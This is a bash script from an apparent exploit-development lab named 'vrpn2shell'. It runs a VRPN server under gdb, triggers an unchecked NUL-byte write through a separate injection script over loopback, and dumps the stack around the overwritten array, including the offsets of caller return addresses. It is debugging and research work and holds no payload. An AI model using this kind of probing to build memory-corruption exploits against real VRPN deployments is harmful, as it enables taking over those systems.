#!/usr/bin/env bash
# Stock -O2 wide-frame probe: bracket the unchecked NUL store in either
# description handler and dump the frame around the array, including the
# three live caller return slots found on the SENDER sink (+136/+200/+312).
# Uses only source-line breakpoints and the array variable address; loopback only.
# Usage: probe-opt-frame-wide.sh <outdir> <port> <index>
# Env overrides: BIN, MSGTYPE, LINE_PRE, LINE_POST, VAR.
set -uo pipefail
OUT=${1:?usage: probe-opt-frame-wide.sh <outdir> <port> <index>}
PORT=${2:?port required}
IDX=${3:?index required}
BIN=${BIN:-lab/frontier/vrpn2shell/build-opt-07.36/server_src/vrpn_server}
MSGTYPE=${MSGTYPE:--1}
LINE_PRE=${LINE_PRE:-4554}
LINE_POST=${LINE_POST:-4560}
VAR=${VAR:-sender_name}

cd "$(dirname "$0")/../../.." || exit 2
mkdir -p "$OUT"
{
  echo "date_utc=$(date -u +%FT%TZ)"
  echo "bin=$BIN"
  echo "bin_sha256=$(sha256sum "$BIN")"
  echo "port=$PORT index=$IDX msgtype=$MSGTYPE line_pre=$LINE_PRE line_post=$LINE_POST var=$VAR"
} >"$OUT/meta.txt"
cat >"$OUT/gdb.cmd" <<EOF
set pagination off
set confirm off
set disassembly-flavor intel
break vrpn_Connection.C:$LINE_PRE
commands
silent
printf "PRE i=%d array=%p rsp=%p rbp=%p dest=%p byte=0x%x\\n", i, &$VAR, \$rsp, \$rbp, (char*)&$VAR+($IDX), *(unsigned char*)((char*)&$VAR+($IDX))
printf "PRE-RETS +136=%p +200=%p +312=%p\\n", *(void**)((char*)&$VAR+136), *(void**)((char*)&$VAR+200), *(void**)((char*)&$VAR+312)
printf "PRE-FRAME from array+128:\\n"
x/48gx (char*)&$VAR+128
bt 6
continue
end
break vrpn_Connection.C:$LINE_POST
commands
silent
printf "POST byte=0x%x RETS +136=%p +200=%p +312=%p\\n", *(unsigned char*)((char*)&$VAR+($IDX)), *(void**)((char*)&$VAR+136), *(void**)((char*)&$VAR+200), *(void**)((char*)&$VAR+312)
bt 6
continue
end
run -f lab/frontier/vrpn2shell/vrpn.cfg $PORT
EOF
timeout 30s gdb -q -batch -x "$OUT/gdb.cmd" --args "$BIN" \
  >"$OUT/gdb.log" 2>&1 &
GPID=$!
sleep 2
python3 lab/frontier/vrpn2shell/wire_inject.py \
  --index "$IDX" --port "$PORT" --msgtype "$MSGTYPE" \
  >"$OUT/client.txt" 2>&1
wait "$GPID" 2>/dev/null || true
echo "=== $OUT"; cat "$OUT/meta.txt"
echo "--- client"; cat "$OUT/client.txt"
echo "--- gdb key lines"
grep -E 'PRE |POST |RETS|FRAME|SIGSEGV|SIGILL|SIGABRT|exited|No symbol|not available|Optimized out|Cannot|Can.t' "$OUT/gdb.log" | head -100
